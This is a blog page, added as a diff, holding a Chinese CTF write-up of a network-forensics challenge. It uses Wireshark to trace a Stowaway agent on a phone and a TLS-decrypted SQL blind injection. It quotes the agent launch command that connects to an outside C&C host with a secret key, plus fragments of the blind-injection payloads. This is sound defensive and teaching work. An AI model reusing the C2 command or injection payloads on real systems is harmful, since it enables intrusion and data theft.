@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>陇剑杯-iOS-wp | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.题目要求1.1 考点 流量分析 日志审计 webshell流量  1.2 环境文件下载附件并且解压，在wireshark打开.pcap包 二.解题步骤问（1） 2.1-1 在过滤栏输入tcp，筛选可疑流量2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话：.&amp;#x2F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="陇剑杯-iOS-wp">
+<meta property="og:url" content="http://example.com/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一.题目要求1.1 考点 流量分析 日志审计 webshell流量  1.2 环境文件下载附件并且解压，在wireshark打开.pcap包 二.解题步骤问（1） 2.1-1 在过滤栏输入tcp，筛选可疑流量2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话：.&amp;#x2F">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-08-16T13:22:39.000Z">
+<meta property="article:modified_time" content="2026-08-16T15:07:56.916Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="陇剑杯">
+<meta property="article:tag" content="iOS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "陇剑杯-iOS-wp",
+  "url": "http://example.com/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2026-08-16T13:22:39.000Z",
+  "dateModified": "2026-08-16T15:07:56.916Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '陇剑杯-iOS-wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">陇剑杯-iOS-wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">陇剑杯-iOS-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-08-16T13:22:39.000Z" title="Created 2026-08-16 21:22:39">2026-08-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-16T15:07:56.916Z" title="Updated 2026-08-16 23:07:56">2026-08-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="一-题目要求"><a href="#一-题目要求" class="headerlink" title="一.题目要求"></a>一.题目要求</h2><h3 id="1-1-考点"><a href="#1-1-考点" class="headerlink" title="1.1 考点"></a>1.1 考点</h3><ul>
+<li>流量分析</li>
+<li>日志审计</li>
+<li>webshell流量</li>
+</ul>
+<h3 id="1-2-环境文件"><a href="#1-2-环境文件" class="headerlink" title="1.2 环境文件"></a>1.2 环境文件</h3><p>下载附件并且解压，在wireshark打开.pcap包</p>
+<h2 id="二-解题步骤"><a href="#二-解题步骤" class="headerlink" title="二.解题步骤"></a>二.解题步骤</h2><p>问（1）<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image.png" alt="alt text"></p>
+<h3 id="2-1-1-在过滤栏输入tcp，筛选可疑流量"><a href="#2-1-1-在过滤栏输入tcp，筛选可疑流量" class="headerlink" title="2.1-1 在过滤栏输入tcp，筛选可疑流量"></a>2.1-1 在过滤栏输入tcp，筛选可疑流量</h3><h3 id="2-1-2-任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码"><a href="#2-1-2-任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码" class="headerlink" title="2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码"></a>2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码</h3><h3 id="2-1-3-浏览到tcp-stream-eq-15时，可以看到关键会话："><a href="#2-1-3-浏览到tcp-stream-eq-15时，可以看到关键会话：" class="headerlink" title="2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话："></a>2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话：</h3><p>.&#x2F;ios_agent -c 3.128.156.159:8081 -s hack4sec
+<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-1.png" alt="alt text"></p>
+<ul>
+<li><code>ios_agent</code>：被植入到受害者手机上的<strong>远控客户端程序</strong></li>
+<li><code>-c  IP:端口</code>：connect，<strong>连接到黑客 C&amp;C 服务器地址</strong><ul>
+<li>IP：<code>3.128.156.159</code></li>
+<li>端口：<code>8081</code></li>
+</ul>
+</li>
+<li><code>-s 字符串</code>：secret，<strong>客户端与 C&amp;C 服务器之间通信的加密密钥</strong></li>
+</ul>
+<h3 id="2-1-4-可以知道flag为3-128-156-159"><a href="#2-1-4-可以知道flag为3-128-156-159" class="headerlink" title="2.1-4 可以知道flag为3.128.156.159"></a>2.1-4 可以知道flag为3.128.156.159</h3><p>问（2）<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-2.png" alt="alt text"></p>
+<h3 id="2-2-1-在过滤栏输入tcp-contains-ios-agent"><a href="#2-2-1-在过滤栏输入tcp-contains-ios-agent" class="headerlink" title="2.2-1 在过滤栏输入tcp contains &quot;ios_agent&quot;"></a>2.2-1 在过滤栏输入tcp contains &quot;ios_agent&quot;</h3><h3 id="2-2-2-得到和问（1）一致的关键会话"><a href="#2-2-2-得到和问（1）一致的关键会话" class="headerlink" title="2.2-2 得到和问（1）一致的关键会话"></a>2.2-2 得到和问（1）一致的关键会话</h3><h3 id="2-2-3-搜索命令特征：gent-c-ip-port-s-secret，发现是开源多级代理工具stowaway的标志性启动参数"><a href="#2-2-3-搜索命令特征：gent-c-ip-port-s-secret，发现是开源多级代理工具stowaway的标志性启动参数" class="headerlink" title="2.2-3 搜索命令特征：gent -c ip:port -s secret，发现是开源多级代理工具stowaway的标志性启动参数"></a>2.2-3 搜索命令特征：gent -c ip:port -s secret，发现是开源多级代理工具stowaway的标志性启动参数</h3><h3 id="2-2-4-所以github开源项目的名字就是stowaway"><a href="#2-2-4-所以github开源项目的名字就是stowaway" class="headerlink" title="2.2-4 所以github开源项目的名字就是stowaway"></a>2.2-4 所以github开源项目的名字就是stowaway</h3><p>问（3）<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-3.png" alt="alt text"></p>
+<h3 id="2-3-1-和问（2）一样在过滤栏输入tcp-contains-ios-agent"><a href="#2-3-1-和问（2）一样在过滤栏输入tcp-contains-ios-agent" class="headerlink" title="2.3-1 和问（2）一样在过滤栏输入tcp contains &quot;ios_agent&quot;"></a>2.3-1 和问（2）一样在过滤栏输入tcp contains &quot;ios_agent&quot;</h3><h3 id="2-3-2-依旧得到关键会话："><a href="#2-3-2-依旧得到关键会话：" class="headerlink" title="2.3-2 依旧得到关键会话："></a>2.3-2 依旧得到关键会话：</h3><p>.&#x2F;ios_agent -c 3.128.156.159:8081 -s hack4sec</p>
+<h3 id="2-3-3-得到密钥为hack4sec"><a href="#2-3-3-得到密钥为hack4sec" class="headerlink" title="2-3-3 得到密钥为hack4sec"></a>2-3-3 得到密钥为hack4sec</h3><p>问（4）<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-4.png" alt="alt text"></p>
+<h3 id="2-4-1-解密TLS流量：在wireshark中点击【编辑】——【首选项】——【Protocol】——【TLS】"><a href="#2-4-1-解密TLS流量：在wireshark中点击【编辑】——【首选项】——【Protocol】——【TLS】" class="headerlink" title="2.4-1 解密TLS流量：在wireshark中点击【编辑】——【首选项】——【Protocol】——【TLS】"></a>2.4-1 解密TLS流量：在wireshark中点击【编辑】——【首选项】——【Protocol】——【TLS】</h3><h3 id="2-4-2"><a href="#2-4-2" class="headerlink" title="2.4-2 "></a>2.4-2 <img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-5.png" alt="alt text"></h3><p>在里面导入题目提供的keylog.txt文件，保存</p>
+<h3 id="2-4-3-在过滤栏输入ip-src-192-168-1-12-http2"><a href="#2-4-3-在过滤栏输入ip-src-192-168-1-12-http2" class="headerlink" title="2.4-3 在过滤栏输入ip.src &#x3D;&#x3D; 192.168.1.12 &amp;&amp; http2"></a>2.4-3 在过滤栏输入ip.src &#x3D;&#x3D; 192.168.1.12 &amp;&amp; http2</h3><h3 id="2-4-4-任意选中一条HTTP2数据包，在下方窗口展开"><a href="#2-4-4-任意选中一条HTTP2数据包，在下方窗口展开" class="headerlink" title="2.4-4 任意选中一条HTTP2数据包，在下方窗口展开"></a>2.4-4 任意选中一条HTTP2数据包，在下方窗口展开</h3><p><code>Hypertext Transfer Protocol 2</code> —— <code>Header</code> + <code>Data</code>
+就能看到GET请求的URI，然后URI解码即可
+<img src="/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/image-6.png" alt="alt text"></p>
+<h3 id="2-4-5-遍历所有HTTP2请求，观察响应延迟，把所有猜对的hex字符按照先后顺序拼接起来"><a href="#2-4-5-遍历所有HTTP2请求，观察响应延迟，把所有猜对的hex字符按照先后顺序拼接起来" class="headerlink" title="2.4-5 遍历所有HTTP2请求，观察响应延迟，把所有猜对的hex字符按照先后顺序拼接起来"></a>2.4-5 遍历所有HTTP2请求，观察响应延迟，把所有猜对的hex字符按照先后顺序拼接起来</h3><ul>
+<li>有延迟sleep生效——比较条件成立——猜对</li>
+<li>无延迟——猜错</li>
+</ul>
+<h3 id="2-4-6-收集完后的字符为"><a href="#2-4-6-收集完后的字符为" class="headerlink" title="2.4-6 收集完后的字符为"></a>2.4-6 收集完后的字符为</h3><p>37343635353866332d633834312d343536622d383564372d643663306632656461626232</p>
+<h3 id="2-4-7-打开在线解码工具，将上面的十六进制字符串解码得到："><a href="#2-4-7-打开在线解码工具，将上面的十六进制字符串解码得到：" class="headerlink" title="2.4-7 打开在线解码工具，将上面的十六进制字符串解码得到："></a>2.4-7 打开在线解码工具，将上面的十六进制字符串解码得到：</h3><p>746558f3-c841-456b-85d7-d6c0f2edabb2
+这就是flag</p>
+<h2 id="三-相关知识点"><a href="#三-相关知识点" class="headerlink" title="三.相关知识点"></a>三.相关知识点</h2><h3 id="3-1-Stowaway（偷渡者）"><a href="#3-1-Stowaway（偷渡者）" class="headerlink" title="3.1 Stowaway（偷渡者）"></a>3.1 Stowaway（偷渡者）</h3><p>Stowaway 是一款多级反弹代理工具，黑客常在靶机植入 agent 客户端，主动连接黑客的 C&amp;C 服务器上线，<code>‑c</code>、<code>‑s</code> 是该工具最标志性的启动参数，流量题看到这个命令基本就可以直接提取 IP 和密钥。</p>
+<h3 id="3-2-Stowaway固定参数"><a href="#3-2-Stowaway固定参数" class="headerlink" title="3.2 Stowaway固定参数"></a>3.2 Stowaway固定参数</h3><ul>
+<li><code>ios_agent</code>：被植入到受害者手机上的<strong>远控客户端程序</strong></li>
+<li><code>-c  IP:端口</code>：connect，<strong>连接到黑客 C&amp;C 服务器地址</strong></li>
+<li><code>-s 字符串</code>：secret，<strong>客户端与 C&amp;C 服务器之间通信的加密密钥</strong></li>
+</ul>
+<h3 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h3><ul>
+<li>问（4）中为什么过滤栏要加http2？</li>
+</ul>
+<h4 id="3-3-1-Stowaway-远控流量（ios‑agent）是TCP-原始流量，走的-8081-端口"><a href="#3-3-1-Stowaway-远控流量（ios‑agent）是TCP-原始流量，走的-8081-端口" class="headerlink" title="3.3-1 Stowaway 远控流量（ios‑agent）是TCP 原始流量，走的 8081 端口"></a>3.3-1 Stowaway 远控流量（ios‑agent）是<strong>TCP 原始流量</strong>，走的 8081 端口</h4><h4 id="3-3-2-SQL-盲注是另外一条独立流量：手机浏览器发起-HTTPS-访问，用-HTTP2"><a href="#3-3-2-SQL-盲注是另外一条独立流量：手机浏览器发起-HTTPS-访问，用-HTTP2" class="headerlink" title="3.3-2 SQL 盲注是另外一条独立流量：手机浏览器发起 HTTPS 访问，用 HTTP2"></a>3.3-2 <strong>SQL 盲注是另外一条独立流量</strong>：手机浏览器发起 HTTPS 访问，用 HTTP2</h4><h3 id="3-3-3-如果只写ip-addr-192-168-1-12，会把远控-stowaway、wifi-流量、网站访问等所有杂乱数据包全部筛出来；"><a href="#3-3-3-如果只写ip-addr-192-168-1-12，会把远控-stowaway、wifi-流量、网站访问等所有杂乱数据包全部筛出来；" class="headerlink" title="3.3-3 如果只写ip.addr == 192.168.1.12，会把远控 stowaway、wifi 流量、网站访问等所有杂乱数据包全部筛出来；"></a>3.3-3 如果只写<code>ip.addr == 192.168.1.12</code>，会把远控 stowaway、wifi 流量、网站访问等<strong>所有杂乱数据包全部筛出来</strong>；</h3><p>加上http2就精准锁定网站访问，过滤掉无关远控流量</p>
+<ul>
+<li>为什么不用之前的C&amp;C服务器IP3.128.156.159？</li>
+</ul>
+<h4 id="1-3-128-156-159：Stowaway-远控服务器-IP（问1答案，用来远程控制手机）"><a href="#1-3-128-156-159：Stowaway-远控服务器-IP（问1答案，用来远程控制手机）" class="headerlink" title="1. 3.128.156.159：Stowaway 远控服务器 IP（问1答案，用来远程控制手机）"></a>1. 3.128.156.159：<strong>Stowaway 远控服务器 IP</strong>（问1答案，用来远程控制手机）</h4><h4 id="2-SQL-盲注攻击：不是直接访问黑客-C-C-服务器，而是黑客控制你的手机，让手机去攻击第三方网站，发出注入数据包。所以盲注流量的目标-IP不是3-128-156-159，而是被攻击-Web-站点的公网-IP"><a href="#2-SQL-盲注攻击：不是直接访问黑客-C-C-服务器，而是黑客控制你的手机，让手机去攻击第三方网站，发出注入数据包。所以盲注流量的目标-IP不是3-128-156-159，而是被攻击-Web-站点的公网-IP" class="headerlink" title="2. SQL 盲注攻击：不是直接访问黑客 C&amp;C 服务器，而是黑客控制你的手机，让手机去攻击第三方网站，发出注入数据包。所以盲注流量的目标 IP不是3.128.156.159，而是被攻击 Web 站点的公网 IP"></a>2. SQL 盲注攻击：<strong>不是直接访问黑客 C&amp;C 服务器</strong>，而是<strong>黑客控制你的手机，让手机去攻击第三方网站</strong>，发出注入数据包。所以盲注流量的目标 IP<strong>不是</strong>3.128.156.159，而是被攻击 Web 站点的公网 IP</h4><ul>
+<li>解密后怎么确认这就是盲注包？
+导入<code>keylog.txt</code>解密 TLS 流量以后，追踪http2流，你就可以看到 URL里带有 <code>if((select hex(password)))</code> 这类<strong>布尔盲注 Payload</strong></li>
+</ul>
+<h3 id="3-4-布尔盲注"><a href="#3-4-布尔盲注" class="headerlink" title="3.4 布尔盲注"></a>3.4 布尔盲注</h3><ul>
+<li><code>substr(password,1,1)</code>：取出密码第1个字符</li>
+<li><code>hex( )</code>：把字符转为十六进制</li>
+<li><code>&gt;</code>：做大小比较（逐字符猜解）</li>
+<li>如果条件成立 —— 页面延时响应 sleep (1)，代表猜对了字符</li>
+</ul>
+<h3 id="3-5-什么是TLS？"><a href="#3-5-什么是TLS？" class="headerlink" title="3.5 什么是TLS？"></a>3.5 什么是TLS？</h3><p><strong>TLS（Transport Layer Security，传输层安全协议）</strong>，就是现在网站用来<strong>加密 HTTPS</strong>的一套规则。</p>
+<ul>
+<li>以前的 HTTP：明文传输，流量抓包直接看见网址、参数、密码，任何人抓包都可以看内容。</li>
+<li>HTTPS&#x3D; <strong>HTTP + TLS 加密</strong>。
+浏览器&#x2F;手机和服务器之间传输的数据全部变成密文，就算你抓到数据包，肉眼看到的也是一堆乱码，看不到请求参数。</li>
+</ul>
+<h3 id="3-6-怎么解开TLS？"><a href="#3-6-怎么解开TLS？" class="headerlink" title="3.6 怎么解开TLS？"></a>3.6 怎么解开TLS？</h3><h4 id="3-6-1-Pre‑Master‑Secret-日志文件（key-log）方案【客户端密钥】（最常用，浏览器抓包）：浏览器在TLS握手时生成Pre‑Master‑Secret，把这个密钥写入key-log。Wireshark-利用这份密钥，解密后续所有加密报文。"><a href="#3-6-1-Pre‑Master‑Secret-日志文件（key-log）方案【客户端密钥】（最常用，浏览器抓包）：浏览器在TLS握手时生成Pre‑Master‑Secret，把这个密钥写入key-log。Wireshark-利用这份密钥，解密后续所有加密报文。" class="headerlink" title="3.6-1 Pre‑Master‑Secret 日志文件（key.log）方案【客户端密钥】（最常用，浏览器抓包）：浏览器在TLS握手时生成Pre‑Master‑Secret，把这个密钥写入key.log。Wireshark 利用这份密钥，解密后续所有加密报文。"></a>3.6-1 <strong>Pre‑Master‑Secret 日志文件（key.log）方案【客户端密钥】</strong>（最常用，浏览器抓包）：浏览器在TLS握手时生成<code>Pre‑Master‑Secret</code>，把这个密钥写入<code>key.log</code>。Wireshark 利用这份密钥，解密后续所有加密报文。</h4><ul>
+<li>适用场景：你能控制客户端（Chrome、Edge、Firefox），抓包时同步生成密钥日志。</li>
+</ul>
+<h4 id="3-6-2-RSA-私钥解密方案【服务端私钥】（拿到网站服务器证书私钥）"><a href="#3-6-2-RSA-私钥解密方案【服务端私钥】（拿到网站服务器证书私钥）" class="headerlink" title="3.6-2 RSA 私钥解密方案【服务端私钥】（拿到网站服务器证书私钥）"></a>3.6-2 <strong>RSA 私钥解密方案【服务端私钥】</strong>（拿到网站服务器证书私钥）</h4><ul>
+<li>适用场景：你拥有目标 Web 服务器，导出它的证书私钥。</li>
+</ul>
+<h3 id="3-7-TLS握手"><a href="#3-7-TLS握手" class="headerlink" title="3.7 TLS握手"></a>3.7 TLS握手</h3><p>握手就是 <strong>客户端 (浏览器 &#x2F; 手机) 和 网站服务器，在正式传输数据之前，先进行的一轮 “暗号协商对话”</strong>。
+目的：商量好加密规则、生成会话密钥，之后双方所有数据都用这个密钥加密传输，别人窃听也看不懂。</p>
+<ul>
+<li>在抓包里可以看到4个核心报文</li>
+</ul>
+<h4 id="1-Client-Hello（客户端问候）"><a href="#1-Client-Hello（客户端问候）" class="headerlink" title="1. Client Hello（客户端问候）"></a>1. <strong>Client Hello（客户端问候）</strong></h4><p>客户端发起连接。告诉服务器：我支持哪些 TLS 版本、哪些加密套件、随机数。</p>
+<h4 id="2-Server-Hello（服务器问候）"><a href="#2-Server-Hello（服务器问候）" class="headerlink" title="2. Server Hello（服务器问候）"></a>2. <strong>Server Hello（服务器问候）</strong></h4><p>服务器返回消息。选定双方都认可的 TLS 版本、加密套件，发送服务器生成的随机数。</p>
+<h4 id="3-服务器下发证书-Certificate"><a href="#3-服务器下发证书-Certificate" class="headerlink" title="3. 服务器下发证书 (Certificate)"></a>3. 服务器下发<strong>证书 (Certificate)</strong></h4><p>服务器把自己的 HTTPS 证书发给客户端，用来证明自己是合法网站。</p>
+<h4 id="4-双方交换材料，算出-Pre‑Master‑Secret（预主密钥）"><a href="#4-双方交换材料，算出-Pre‑Master‑Secret（预主密钥）" class="headerlink" title="4. 双方交换材料，算出 Pre‑Master‑Secret（预主密钥）"></a>4. 双方交换材料，算出 <strong>Pre‑Master‑Secret（预主密钥）</strong></h4><p>客户端与服务器各自运算，得到<strong>完全一样的会话密钥</strong>。
+握手到此完成</p>
+<h3 id="3-8-TLS加密通信流程"><a href="#3-8-TLS加密通信流程" class="headerlink" title="3.8 TLS加密通信流程"></a>3.8 TLS加密通信流程</h3><h4 id="1-手机-↔-Web-服务器握手，协商加密规则、生成密钥"><a href="#1-手机-↔-Web-服务器握手，协商加密规则、生成密钥" class="headerlink" title="1. 手机 ↔ Web 服务器握手，协商加密规则、生成密钥"></a>1. 手机 ↔ Web 服务器握手，协商加密规则、生成密钥</h4><h4 id="2-手机发送盲注请求：-info-l-1-o-case-when-，先被-TLS-加密成二进制密文，再发出去"><a href="#2-手机发送盲注请求：-info-l-1-o-case-when-，先被-TLS-加密成二进制密文，再发出去" class="headerlink" title="2. 手机发送盲注请求：/info?l=1&amp;o=(case when ...)，先被 TLS 加密成二进制密文，再发出去"></a>2. 手机发送盲注请求：<code>/info?l=1&amp;o=(case when ...)</code>，<strong>先被 TLS 加密成二进制密文</strong>，再发出去</h4><h4 id="3-Wireshark抓到加密后的数据包"><a href="#3-Wireshark抓到加密后的数据包" class="headerlink" title="3. Wireshark抓到加密后的数据包"></a>3. Wireshark抓到加密后的数据包</h4><h4 id="4-Wireshark使用key-log里面的密钥解密，还原出原始明文-URL"><a href="#4-Wireshark使用key-log里面的密钥解密，还原出原始明文-URL" class="headerlink" title="4. Wireshark使用key.log里面的密钥解密，还原出原始明文 URL"></a>4. Wireshark使用<code>key.log</code>里面的密钥解密，还原出原始明文 URL</h4></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/">http://example.com/2026/08/16/%E9%99%87%E5%89%91%E6%9D%AF-iOS-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E9%99%87%E5%89%91%E6%9D%AF/">陇剑杯</a><a class="post-meta__tags" href="/tags/iOS/">iOS</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2026/08/16/CISCN-wp/" title="CISCN-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">CISCN-wp</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/08/05/%E9%99%87%E5%89%91%E6%9D%AF-webshell-wp/" title="陇剑杯-webshell-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-05</div><div class="info-item-2">陇剑杯-webshell-wp</div></div><div class="info-2"><div class="info-item-1">一.题目介绍网站被黑客挂马，要求从流量中分析出webshell 1.1 考点 流量分析 wireshark的使用 日志审计  1.2 环境文件 下载附件，用wireshark打开 二.解题步骤 问（1） 2.1-1 设置过滤条件，定位登录数据包：在过滤栏中输入http.request.method &#x3D;&#x3D; &#39;POST&#39;   ### 2.1-2 在筛选结果中，找到目标登录数据包（访问路径包含login.php）   ### 2.1-3 右键数据包，点击【追踪流】——【TCP流】  ### 2.1-4 在弹出的流窗中找到POST表单内容： username=test&password=Admin123!@#&expire=0  ### 2.1-5 URL解码后40=@，23=#，所以密码为Admin123!@#，即flag为Admin123!@#  问（2） 2.2-1 在过滤栏中输入http contains &#39;.log&#39; ### 2.2-2 逐个右键数据包——【追踪流】——【TCP流】（优先选择长度最大的），在其中一条POST请求...</div></div></div></a><a class="pagination-related" href="/2026/08/15/%E9%99%87%E5%89%91%E6%9D%AF-SQL%E6%B3%A8%E5%85%A5-wp/" title="陇剑杯-SQL注入-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-15</div><div class="info-item-2">陇剑杯-SQL注入-wp</div></div><div class="info-2"><div class="info-item-1">一.题目要求运用SQL注入知识得到flag 1.1 考点 流量分析 SQL注入 office文档破解 日志审计  1.2 